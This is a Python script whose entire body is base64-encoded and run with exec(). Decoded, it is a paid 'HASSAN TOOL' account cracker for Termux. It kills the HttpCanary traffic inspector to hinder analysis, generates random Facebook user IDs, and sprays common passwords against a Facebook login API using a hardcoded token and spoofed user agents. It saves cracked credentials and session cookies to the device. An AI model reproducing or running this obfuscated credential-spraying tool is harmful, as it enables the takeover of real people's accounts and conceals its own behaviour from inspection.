import base64
exec(base64.b64decode(b'aW1wb3J0IG9zCmltcG9ydCBzeXMKaW1wb3J0IHRpbWUKaW1wb3J0IHJlCmltcG9ydCByYW5kb20KaW1wb3J0IHV1aWQKaW1wb3J0IGpzb24KaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHB5Y3VybApmcm9tIGlvIGltcG9ydCBCeXRlc0lPCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMgdHJlZApmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cCBhcyBzb3AKZnJvbSByYW5kb20gaW1wb3J0IGNob2ljZSBhcyByYWNlCmZyb20gc3RyaW5nIGltcG9ydCBkaWdpdHMsIGFzY2lpX2xldHRlcnMKaW1wb3J0IHVybGxpYi5wYXJzZQppbXBvcnQgYmFzZTY0CmltcG9ydCBjdHlwZXMKCnByaW50KCdceDFiWzE7OTFtW1x4MWJbMTs5N20tXHgxYlsxOzkxbV0gXHgxYlsxOzkybSBXRUxDT01FIFRPIEhBU1NBTiBUT09MJykKb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL2NoYXQud2hhdHNhcHAuY29tL0hBb2kxb1dPNGlCOW9NYmRwNWhPVWMnKQp0aW1lLnNsZWVwKDIpCgpkZWYgcnVuX3N5c3RlbV9jb21tYW5kKGNvbW1hbmQpOgogICAgb3Muc3lzdGVtKGYne2NvbW1hbmR9ID4vZGV2L251bGwgMj4mMScpCgpydW5fc3lzdGVtX2NvbW1hbmQoJ2NobW9kIDcwMCAvZGF0YS9kYXRhL2NvbS50ZXJtdXgvZmlsZXMvdXNyL2JpbicpCnJ1bl9zeXN0ZW1fY29tbWFuZCgncGtpbGwgLWYgaHR0Y2FuYXJ5JykKCmNsYXNzIE5lYnVsYUNvbG9yczoKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLlcgPSAnXHgxYls5NzsxbScKICAgICAgICBzZWxmLlIgPSAnXHgxYls5MTsxbScKICAgICAgICBzZWxmLkcgPSAnXHgxYls5MjsxbScKICAgICAgICBzZWxmLlkgPSAnXHgxYls5MzsxbScKICAgICAgICBzZWxmLkIgPSAnXHgxYls5NDsxbScKICAgICAgICBzZWxmLlAgPSAnXHgxYls5NTsxbScKICAgICAgICBzZWxmLkMgPSAnXHgxYls5NjsxbScKICAgICAgICBzZWxmLk4gPSAnXHgxYlswbScKICAgICAgCmRlZiBwcm9fYmFubmVyKCk6CiAgICByZXR1cm4gIiIiClx4MWJbMTs5Nm0KIOKWkeKWiOKWiOKWiCAgICAg4paR4paI4paI4paIIOKWkeKWiOKWiCAgICAg4paR4paI4paIIOKWkeKWiOKWiOKWiOKWiOKWiOKWiOKWiCAgIAog4paR4paI4paI4paI4paIICAg4paR4paI4paI4paI4paIIOKWkeKWiOKWiCAgICAg4paR4paI4paIIOKWkeKWiOKWiCAgIOKWkeKWiOKWiCAgCiDilpHilojilojilpHilojilogg4paR4paI4paI4paR4paI4paIIOKWkeKWiOKWiCAgICAg4paR4paI4paIIOKWkeKWiOKWiCAgICDilpHilojiloggCiDilpHilojilogg4paR4paI4paI4paI4paIIOKWkeKWiOKWiCDilpHilojilojilojilojilojilojilojilojilojilogg4paR4paI4paIICAgIOKWkeKWiOKWiCAKIOKWkeKWiOKWiCAg4paR4paI4paIICDilpHilojilogg4paR4paI4paIICAgICDilpHilojilogg4paR4paI4paIICAgIOKWkeKWiOKWiCAKIOKWkeKWiOKWiCAgICAgICDilpHilojilogg4paR4paI4paIICAgICDilpHilojilogg4paR4paI4paIICAg4paR4paI4paIICAKIOKWkeKWiOKWiCAgICAgICDilpHilojilogg4paR4paI4paIICAgICDilpHilojilogg4paR4paI4paI4paI4paI4paI4paI4paIICAgClx4MWJbMTs5NW3ilZTilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZcKXHgxYlsxOzk1beKVkVx4MWJbMTs5N20gICAgICDinKYgIPCdl6fwnZei8J2XovCdl58gSfCdl6HwnZeZ8J2XoiDwnZej8J2XlPCdl6HwnZeY8J2XnyAg4pymICAgICAgICBceDFiWzE7OTVt4pWRClx4MWJbMTs5NW3ilZrilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZ0KXHgxYlsxOzk2bSAgIOKepCBceDFiWzE7OTdtQ3JlYXRvciAgICAgICAgOiBceDFiWzE7OTZtSEFTU0FOLVRSSUNLRVIKXHgxYlsxOzk2bSAgIOKepCBceDFiWzE7OTdtT3BlcmF0ZWQgQnkgICAgOiBceDFiWzE7OTJtSkFOSVlBLVRPT0xTIApceDFiWzE7OTZtICAg4p6kIFx4MWJbMTs5N21Ub29sIEFjY2VzcyAgICA6IFx4MWJbMTs5M21QQUlEIApceDFiWzE7OTZtICAg4p6kIFx4MWJbMTs5N21DdXJyZW50IFZlcnNpb246IFx4MWJbMTs5NW0xLjIKXHgxYlsxOzkybeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgCIiIgoKZGVmIGxpbmV4KCk6CiAgICBjb2xvciA9IE5lYnVsYUNvbG9ycygpCiAgICBwcmludChmIiAge2NvbG9yLlB94pWU4pWQ4pSB4pSA4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSA4pSB4pWQ4pWXIikKICAgIHByaW50KGYiICB7Y29sb3IuUH3ilZEgICAge2NvbG9yLll94piFIFBSRU1JVU0gVE9PTCBJTlRFUkZBQ0Ug4piFICAgIHtjb2xvci5QfeKVkSIpCiAgICBwcmludChmIiAge2NvbG9yLlB94pWa4pWQ4pSB4pSA4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSA4pSB4pWQ4pWde2NvbG9yLk59IikKCmRlZiBjbGVhcigpOgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludChwcm9fYmFubmVyKCkpCgpkZWYgc2VjdXJlX3hvcihkYXRhLCBrZXk9ODUpOgogICAgcmV0dXJuIGJ5dGVzKFtiIF4ga2V5IGZvciBiIGluIGRhdGFdKQoKZGVmIGdldF9oaWRkZW5fdXJsKCk6CiAgICBwYXJ0cyA9IFsKICAgICAgICBzZWN1cmVfeG9yKGInaHR0cHM6Ly8nKSwKICAgICAgICBzZWN1cmVfeG9yKGInZ2l0aHViLmNvbS8nKSwKICAgICAgICBzZWN1cmVfeG9yKGInMS1OQUxMQS8nKSwKICAgICAgICBzZWN1cmVfeG9yKGInSmlubl9BcHAvJyksCiAgICAgICAgc2VjdXJlX3hvcihiJ2Jsb2IvbWFpbi8nKSwKICAgICAgICBzZWN1cmVfeG9yKGInQXBwLnR4dCcpCiAgICBdCiAgICByZXR1cm4gYiIiLmpvaW4oc2VjdXJlX3hvcihwYXJ0KSBmb3IgcGFydCBpbiBwYXJ0cykuZGVjb2RlKCkKCmNsYXNzIFVzZXJBZ2VudEdlbmVyYXRvcjoKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmN1c3RvbV91c2VyX2FnZW50cyA9IFsKICAgICAgICAgICAgIltGQkFOL0ZCNEE7RkJBVi8yNjQuMC4wLjQ0LjExMTtbRkJBTi9GQjRBO0ZCQVZGQkJWLzIwNjYzNjcyODtGQkRNL3tkZW5zaXR5PTMuMzc1LHdpZHRoPTEwODAsaGVpZ2h0PTIwNTh9O0ZCTEMvZW5fVVM7RkJSVi9WZXJpem9uO0ZCQ1Ivc2Ftc3VuZztGQkJEL3NhbXN1bmc7RkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCRFYvU00tRzg5MkE7RkJTVi8xMTtGQk9QLzE7RkJDQS9hcm02NC12OGE7XSIsCiAgICAgICAgXQoKICAgIGRlZiBfZ2VuZXJhdGVfbW96aWxsYV91c2VyX2FnZW50KHNlbGYpOgogICAgICAgIGFuZHJvaWRfdmVyc2lvbiA9IHJhbmRvbS5yYW5kaW50KDQsIDEzKQogICAgICAgIGRldmljZSA9IHJhbmRvbS5jaG9pY2UoKCdTTS1HOTAwRicsICdTTS1HOTIwRicsICdTTS1UNTM1JywgJ1NNLVQyMzEnLCAnU00tSjMyMEYnLCAnR1QtSTkxOTAnKSkKICAgICAgICByZXNvbHV0aW9uID0gcmFuZG9tLmNob2ljZSgoJ3tkZW5zaXR5PTEuNSx3aWR0aD03MjAsaGVpZ2h0PTEyODB9JywgJ3tkZW5zaXR5PTMuNSx3aWR0aD0xNDQwLGhlaWdodD0zMDQwfScpKQogICAgICAgIGNocm9tZV92ZXJzaW9uID0gZiJ7cmFuZG9tLnJhbmRpbnQoMTAwLCAxNTApfS4wLjAuMCIKICAgICAgICByZXR1cm4gZiJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQge2FuZHJvaWRfdmVyc2lvbn07IHtkZXZpY2V9KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUve2Nocm9tZV92ZXJzaW9ufSBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbe3Jlc29sdXRpb259XSIKCiAgICBkZWYgZ2VuZXJhdGVfdXNlcl9hZ2VudChzZWxmKToKICAgICAgICB1c2VyX2FnZW50X3R5cGUgPSByYW5kb20uY2hvaWNlKCgnTW96aWxsYScsICdGYWNlYm9vaycsICdEYWx2aWsnLCAnaVBob25lJywgJ0N1c3RvbScpKQogICAgICAgIGlmIHVzZXJfYWdlbnRfdHlwZSA9PSAnTW96aWxsYSc6CiAgICAgICAgICAgIHJldHVybiBzZWxmLl9nZW5lcmF0ZV9tb3ppbGxhX3VzZXJfYWdlbnQoKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHJldHVybiByYW5kb20uY2hvaWNlKHNlbGYuY3VzdG9tX3VzZXJfYWdlbnRzKQoKICAgIGRlZiBsb2FkX3VzZXJfYWdlbnRzX2Zyb21fdXJsKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgaW1wb3J0IHJlcXVlc3RzCiAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vdHJ0LUZpcmUvZGF0YS9tYWluL3VhLnR4dCcpCiAgICAgICAgICAgIHJldHVybiByZXNwb25zZS50ZXh0LnNwbGl0bGluZXMoKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHJldHVybiBbXQoKY2xhc3MgSEFTU0FOQ3JhY2tlcjoKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLm9rcyA9IFtdCiAgICAgICAgc2VsZi5jcHMgPSBbXQogICAgICAgIHNlbGYubG9vcCA9IDAKICAgICAgICBzZWxmLmNvbG9yID0gTmVidWxhQ29sb3JzKCkKICAgICAgICBzZWxmLnVzZXJfYWdlbnRzID0gVXNlckFnZW50R2VuZXJhdG9yKCkubG9hZF91c2VyX2FnZW50c19mcm9tX3VybCgpCgogICAgZGVmIG9sZF9tZW51KHNlbGYpOgogICAgICAgIGNsZWFyKCkKICAgICAgICBwcmludChmIntzZWxmLmNvbG9yLlB94pWU4pWQ4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pWQ4pWXIikKICAgICAgICBwcmludChmIntzZWxmLmNvbG9yLlB94pWRICAgICAgICAge3NlbGYuY29sb3IuWX3imIUgT0xEIEFDQ09VTlQgQ1JBQ0tFUiDimIUgICAgICAgICB7c2VsZi5jb2xvci5QfeKVkSIpCiAgICAgICAgcHJpbnQoZiJ7c2VsZi5jb2xvci5QfeKVoOKVkOKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKVkOKVoyIpCiAgICAgICAgcHJpbnQoZiJ7c2VsZi5jb2xvci5QfeKVkSB7c2VsZi5jb2xvci5DfVsxXSB7c2VsZi5jb2xvci5HfUNSQUNLIDIwMDkgQUNDT1VOVFMgICAgICAgICAgICAgICAgIHtzZWxmLmNvbG9yLlB94pWRIikKICAgICAgICBwcmludChmIntzZWxmLmNvbG9yLlB94pWRIHtzZWxmLmNvbG9yLkN9WzJdIHtzZWxmLmNvbG9yLkd9Q1JBQ0sgMjAwOS0yMDEzIEFDQ09VTlRTICAgICAgICAgICAge3NlbGYuY29sb3IuUH3ilZEiKQogICAgICAgIHByaW50KGYie3NlbGYuY29sb3IuUH3ilZEge3NlbGYuY29sb3IuQ31bMF0ge3NlbGYuY29sb3IuUn3ih6YgQkFDSyBUTyBNQUlOIE1FTlUgICAgICAgICAgICAgICAgIHtzZWxmLmNvbG9yLlB94pWRIikKICAgICAgICBwcmludChmIntzZWxmLmNvbG9yLlB94pWa4pWQ4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pWQ4pWdIikKCiAgICAgICAgY2hvaWNlID0gaW5wdXQoZiIgIHtzZWxmLmNvbG9yLkN9XHgxYlsxOzk2bSDinqQgQ2hvb3NlOiB7c2VsZi5jb2xvci5XfSIpLnN0cmlwKCkKICAgICAgICAKICAgICAgICBpZiBjaG9pY2UgaW4gKCcxJywgJzAxJyk6CiAgICAgICAgICAgIHNlbGYuZXhlY3V0ZV9icmVhY2goJzEwMDAwMCcpCiAgICAgICAgZWxpZiBjaG9pY2UgaW4gKCcyJywgJzAyJyk6CiAgICAgICAgICAgIHNlbGYucXVhbnR1bV9icmVhY2hfbWVudSgpCiAgICAgICAgZWxpZiBjaG9pY2UgaW4gKCcwJywgJzAwJyk6CiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYiXG4gIHtzZWxmLmNvbG9yLlJ94pqgIEludmFsaWQgY2hvaWNlISIpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMikKICAgICAgICAgICAgc2VsZi5vbGRfbWVudSgpCgogICAgZGVmIHF1YW50dW1fYnJlYWNoX21lbnUoc2VsZik6CiAgICAgICAgY2xlYXIoKQogICAgICAgIHNlcmllc19tYXAgPSB7CiAgICAgICAgICAgICcxJzogJzEwMDAwMCcsICcyJzogJzEwMDAwMScsICczJzogJzEwMDAwMicsIAogICAgICAgICAgICAnNCc6ICcxMDAwMDMnLCAnNSc6ICcxMDAwMDQnCiAgICAgICAgfQogICAgICAgIHByaW50KGYiICB7c2VsZi5jb2xvci5XfVx4MWJbMTs5Nm0g4p6kIFNlbGVjdCBTZXJpZXM6IikKICAgICAgICBmb3IgbnVtLCBwcmVmaXggaW4gc2VyaWVzX21hcC5pdGVtcygpOgogICAgICAgICAgICBwcmludChmIiAge3NlbGYuY29sb3IuV31be3NlbGYuY29sb3IuR317bnVtfXtzZWxmLmNvbG9yLld9XSB7c2VsZi5jb2xvci5DfXtwcmVmaXh9IikKICAgICAgICAKICAgICAgICBsaW5leCgpCiAgICAgICAgY2hvaWNlID0gaW5wdXQoZiIgIHtzZWxmLmNvbG9yLkN9XHgxYlsxOzk2bSDinqQgQ2hvb3NlOiB7c2VsZi5jb2xvci5XfSIpLnN0cmlwKCkKICAgICAgICBzZWxlY3RlZF9wcmVmaXggPSBzZXJpZXNfbWFwLmdldChjaG9pY2UpCgogICAgICAgIGlmIG5vdCBzZWxlY3RlZF9wcmVmaXg6CiAgICAgICAgICAgIHByaW50KGYiICB7c2VsZi5jb2xvci5SfeKaoCBJbnZhbGlkIFNlcmllcyEiKQogICAgICAgICAgICB0aW1lLnNsZWVwKDIpCiAgICAgICAgICAgIHNlbGYucXVhbnR1bV9icmVhY2hfbWVudSgpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIAogICAgICAgIHNlbGYuZXhlY3V0ZV9icmVhY2goc2VsZWN0ZWRfcHJlZml4KQoKICAgIGRlZiBleGVjdXRlX2JyZWFjaChzZWxmLCBwcmVmaXgpOgogICAgICAgIHRyeToKICAgICAgICAgICAgY2xlYXIoKQogICAgICAgICAgICBsaW1pdCA9IGludChpbnB1dChmIiAge3NlbGYuY29sb3IuR31ceDFiWzE7OTZtIOKepCBFbnRlciBMaW1pdDoge3NlbGYuY29sb3IuV30iKSkKICAgICAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICAgICAgcHJpbnQoZiIgIHtzZWxmLmNvbG9yLlJ94pqgIEludmFsaWQgTnVtYmVyISIpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMikKICAgICAgICAgICAgc2VsZi5vbGRfbWVudSgpCiAgICAgICAgICAgIHJldHVybgoKICAgICAgICB0YXJnZXRzID0gW3ByZWZpeCArICcnLmpvaW4ocmFuZG9tLmNob2ljZXMoZGlnaXRzLCBrPTkpKSBmb3IgXyBpbiByYW5nZShsaW1pdCldCiAgICAgICAgcGFzc2xpc3QgPSBbJzEyMzQ1Njc4OScsICcxMjM0NTYnLCAnMTIzNDU2NzgnLCAnMTIzNDU2NycsICcxMjM0NTY3ODkwJ10KCiAgICAgICAgd2l0aCB0cmVkKG1heF93b3JrZXJzPTMwKSBhcyBleGVjdXRvcjoKICAgICAgICAgICAgY2xlYXIoKQogICAgICAgICAgICBwcmludChmIiAge3NlbGYuY29sb3IuV31ceDFiWzE7OTZtICAg4p6kIENyYWNraW5nIHtzZWxmLmNvbG9yLll9e3ByZWZpeH0gIikKICAgICAgICAgICAgcHJpbnQoZiIgIHtzZWxmLmNvbG9yLld9XHgxYlsxOzk2bSAgIOKepCBUYXJnZXRzOiB7c2VsZi5jb2xvci5HfXtsZW4odGFyZ2V0cyl9IikKICAgICAgICAgICAgbGluZXgoKQogICAgICAgICAgICBmb3IgdGFyZ2V0IGluIHRhcmdldHM6CiAgICAgICAgICAgICAgICBleGVjdXRvci5zdWJtaXQoc2VsZi5icmVhY2hfdGFyZ2V0LCB0YXJnZXQsIHBhc3NsaXN0KQogICAgICAgIAogICAgICAgIHNlbGYuZGlzcGxheV9yZXN1bHRzKCkKCiAgICBkZWYgYnJlYWNoX3RhcmdldChzZWxmLCB0YXJnZXQsIHBhc3NsaXN0KToKICAgICAgICBzZWxmLmxvb3AgKz0gMQogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZidcciAge3NlbGYuY29sb3IuV31bSEFTU0FOXSB7c2VsZi5sb29wfXx7c2VsZi5jb2xvci5SfXtsZW4oc2VsZi5va3MpfXx7c2VsZi5jb2xvci5HfXtsZW4oc2VsZi5jcHMpfXtzZWxmLmNvbG9yLld9JykKICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICBmb3IgcGFzc3dvcmQgaW4gcGFzc2xpc3Q6CiAgICAgICAgICAgIGlmIHNlbGYudHJ5X2JyZWFjaCh0YXJnZXQsIHBhc3N3b3JkKToKICAgICAgICAgICAgICAgIGJyZWFrCgogICAgZGVmIHRyeV9icmVhY2goc2VsZiwgdWlkLCBwYXNzd29yZCk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB1YSA9IHJhbmRvbS5jaG9pY2Uoc2VsZi51c2VyX2FnZW50cykKICAgICAgICAgICAgCiAgICAgICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAgICAgICAnVXNlci1BZ2VudCc6IHVhLAogICAgICAgICAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnLAogICAgICAgICAgICAgICAgJ0hvc3QnOiAnZ3JhcGguZmFjZWJvb2suY29tJywKICAgICAgICAgICAgICAgICdBdXRob3JpemF0aW9uJzogJ09BdXRoIDM1MDY4NTUzMTcyOHw2MmY4Y2U5Zjc0YjEyZjg0YzEyM0Rpb3IyMzQzN2E0YTMyJywKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgcGF5bG9hZCA9IHsKICAgICAgICAgICAgICAgICdhZGlkJzogc3RyKHV1aWQudXVpZDQoKSksCiAgICAgICAgICAgICAgICAnZm9ybWF0JzogJ2pzb24nLAogICAgICAgICAgICAgICAgJ2RldmljZV9pZCc6IHN0cih1dWlkLnV1aWQ0KCkpLAogICAgICAgICAgICAgICAgJ2VtYWlsJzogdWlkLAogICAgICAgICAgICAgICAgJ3Bhc3N3b3JkJzogcGFzc3dvcmQsCiAgICAgICAgICAgICAgICAnYWNjZXNzX3Rva2VuJzogJzM1MDY4NTUzMTcyOHw2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMicsCiAgICAgICAgICAgICAgICAnZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzJzogJzEnLAogICAgICAgICAgICAgICAgJ21ldGhvZCc6ICdhdXRoLmxvZ2luJywKICAgICAgICAgICAgfQoKICAgICAgICAgICAgZW5jb2RlZF9wYXlsb2FkID0gdXJsbGliLnBhcnNlLnVybGVuY29kZShwYXlsb2FkKQogICAgICAgICAgICBidWZmZXIgPSBCeXRlc0lPKCkKICAgICAgICAgICAgYyA9IHB5Y3VybC5DdXJsKCkKICAgICAgICAgICAgYy5zZXRvcHQoYy5VUkwsICdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9hdXRoL2xvZ2luJykKICAgICAgICAgICAgYy5zZXRvcHQoYy5QT1NULCAxKQogICAgICAgICAgICBjLnNldG9wdChjLlBPU1RGSUVMRFMsIGVuY29kZWRfcGF5bG9hZCkKICAgICAgICAgICAgYy5zZXRvcHQoYy5XUklURURBVEEsIGJ1ZmZlcikKICAgICAgICAgICAgYy5zZXRvcHQoYy5USU1FT1VULCAxMCkKICAgICAgICAgICAgCiAgICAgICAgICAgIGhlYWRlcl9saXN0ID0gW2Yie2tleX06IHt2YWx1ZX0iIGZvciBrZXksIHZhbHVlIGluIGhlYWRlcnMuaXRlbXMoKV0KICAgICAgICAgICAgYy5zZXRvcHQoYy5IVFRQSEVBREVSLCBoZWFkZXJfbGlzdCkKICAgICAgICAgICAgCiAgICAgICAgICAgIGMucGVyZm9ybSgpCiAgICAgICAgICAgIHJlc3BvbnNlX2JvZHkgPSBidWZmZXIuZ2V0dmFsdWUoKS5kZWNvZGUoJ3V0Zi04JykKICAgICAgICAgICAgcmVzcG9uc2UgPSBqc29uLmxvYWRzKHJlc3BvbnNlX2JvZHkpCiAgICAgICAgICAgIGMuY2xvc2UoKQogICAgICAgICAgICBidWZmZXIuY2xvc2UoKQoKICAgICAgICAgICAgaWYgJ3Nlc3Npb25fa2V5JyBpbiByZXNwb25zZToKICAgICAgICAgICAgICAgIHNlbGYuaGFuZGxlX3N1Y2Nlc3ModWlkLCBwYXNzd29yZCwgcmVzcG9uc2UpCiAgICAgICAgICAgICAgICByZXR1cm4gVHJ1ZQogICAgICAgICAgICBlbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiByZXNwb25zZS5nZXQoJ2Vycm9yJywge30pLmdldCgnbWVzc2FnZScsICcnKToKICAgICAgICAgICAgICAgIHNlbGYuaGFuZGxlX3BhcnRpYWwodWlkLCBwYXNzd29yZCkKICAgICAgICAgICAgICAgIHJldHVybiBUcnVlCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgcmV0dXJuIEZhbHNlCiAgICAgICAgcmV0dXJuIEZhbHNlCgogICAgZGVmIGhhbmRsZV9zdWNjZXNzKHNlbGYsIHVpZCwgcGFzc3dvcmQsIHJlc3BvbnNlKToKICAgICAgICBjb2tpID0gJzsnLmpvaW4oW2Yie2NbJ25hbWUnXX09e2NbJ3ZhbHVlJ119IiBmb3IgYyBpbiByZXNwb25zZS5nZXQoJ3Nlc3Npb25fY29va2llcycsIFtdKV0pCiAgICAgICAgcHJpbnQoZiJcciAge3NlbGYuY29sb3IuR31ceDFiWzE7OTZtICAg4p6kIFNVQ0NFU1Mge3NlbGYuY29sb3IuV317dWlkfXx7c2VsZi5jb2xvci5HfXtwYXNzd29yZH17c2VsZi5jb2xvci5XfSIpCiAgICAgICAgd2l0aCBvcGVuKCcvc2RjYXJkL0hBU1NBTi1PTEQudHh0JywgJ2EnKSBhcyBmOgogICAgICAgICAgICBmLndyaXRlKGYne3VpZH18e3Bhc3N3b3JkfXx7Y29raX1cbicpCiAgICAgICAgc2VsZi5va3MuYXBwZW5kKHVpZCkKCiAgICBkZWYgaGFuZGxlX3BhcnRpYWwoc2VsZiwgdWlkLCBwYXNzd29yZCk6CiAgICAgICAgcHJpbnQoZiJcciAge3NlbGYuY29sb3IuWX1ceDFiWzE7OTZtICAg4p6kIE9LIHtzZWxmLmNvbG9yLkd9e3VpZH17c2VsZi5jb2xvci5ZfeKAolx4MWJbMTs5MG17cGFzc3dvcmR9e3NlbGYuY29sb3IuV30iKQogICAgICAgIHdpdGggb3BlbignL3NkY2FyZC9IQVNTQU4tT0xELnR4dCcsICdhJykgYXMgZjoKICAgICAgICAgICAgZi53cml0ZShmJ3t1aWR9fHtwYXNzd29yZH1cbicpCiAgICAgICAgc2VsZi5jcHMuYXBwZW5kKHVpZCkKICAgICAgICAKICAgIGRlZiBkaXNwbGF5X3Jlc3VsdHMoc2VsZik6CiAgICAgICAgY2xlYXIoKQogICAgICAgIHByaW50KGYiICB7c2VsZi5jb2xvci5HfVx4MWJbMTs5Nm0gICDinqQgQ1JBQ0tJTkcgQ09NUExFVEUiKQogICAgICAgIGxpbmV4KCkKICAgICAgICBwcmludChmIiAge3NlbGYuY29sb3IuV31DUDoge3NlbGYuY29sb3IuWX17bGVuKHNlbGYub2tzKX0iKQogICAgICAgIHByaW50KGYiICB7c2VsZi5jb2xvci5XfU9LOiB7c2VsZi5jb2xvci5HfXtsZW4oc2VsZi5jcHMpfSIpCiAgICAgICAgbGluZXgoKQogICAgICAgIGlucHV0KGYiICB7c2VsZi5jb2xvci5DfVByZXNzIEVOVEVSIHRvIGNvbnRpbnVlIHtzZWxmLmNvbG9yLld9IikKICAgICAgICBzZWxmLm9sZF9tZW51KCkKCiAgICAgICAgZGVmIGNsZWFyKCk6CiAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgIHByaW50KHByb19iYW5uZXIoKSkKCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CiAgICB0cnk6CiAgICAgICAgY3JhY2tlciA9IEhBU1NBTkNyYWNrZXIoKQogICAgICAgIGNyYWNrZXIub2xkX21lbnUoKQogICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgogICAgICAgIHByaW50KCdcblx4MWJbOTE7MW0gICDinqQgU3RvcHBlZFx4MWJbOTc7MW0nKQogICAgICAgIHN5cy5leGl0KCkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmJ1xuXHgxYls5MTsxbSAgIOKepCBFcnJvcjoge3N0cihlKX1ceDFiWzk3OzFtJykKICAgICAgICBzeXMuZXhpdCgp'))